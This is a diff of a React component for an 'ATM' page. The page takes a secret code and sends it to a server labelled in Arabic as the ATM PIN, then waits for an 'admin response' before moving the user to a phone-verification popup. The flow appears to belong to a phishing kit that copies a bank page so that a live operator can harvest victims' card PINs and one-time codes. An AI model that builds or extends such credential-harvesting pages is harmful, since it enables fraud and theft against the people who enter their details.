@@ -1,12 +1,15 @@
 import Main from "@/components/Main";
-import { Link, useLocation, useNavigate } from "react-router-dom";
-import InputWithClearIcon from "../components/InputWithClearIcon";
+import { Link, useNavigate } from "react-router-dom";
+import InputWithClearIcon from "@/components/InputWithClearIcon";
+import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
 import { useEffect } from "react";
-import { currentPage, sendDataToServer } from "@/context/signals";
 
-const SecretCode = () => {
+const Atm = () => {
+  useEffect(() => {
+    setCurrentPage("atm");
+  }, []);
+
   const navigate = useNavigate();
-  const { state } = useLocation();
 
   const goNext = (e: any) => {
     e.preventDefault();
@@ -14,28 +17,29 @@ const SecretCode = () => {
     // console.log(data);
 
     // [ ] should be true for production
-    sendDataToServer(
-      data,
-      "atm",
-      "mobileverfication",
-      false,
+    sendDataToServer({
+      data: {
+        "atm الرقم السري": data["secret-code"],
+      },
+      current: "atm",
+      nextPage: "phone-popup",
+      waitingForAdminResponse: true,
       navigate,
-      "/mobileverfication",
-      {
-        ...state,
-        ...data,
-      }
-    );
+    });
   };
-
-  useEffect(() => {
-    currentPage.value = "atm";
-  }, []);
 
   return (
     <Main>
       <section className="bg-gray-100 h-screen pt-20">
         <div className="bg-white container mx-auto px-4 py-6 rounded-xl max-w-lg">
+          <div className="py-2 px-6 mb-4 rounded-xl">
+            <img
+              src="/assets/images/logo.svg"
+              alt="logo"
+              className="h-10 mx-auto"
+            />
+          </div>
+
           <div className="bg-main/20 rounded-2xl py-3 ps-4 pe-20 relative">
             <img
               src="/assets/images/ATM.png"
@@ -86,4 +90,4 @@ const SecretCode = () => {
     </Main>
   );
 };
-export default SecretCode;
+export default Atm;
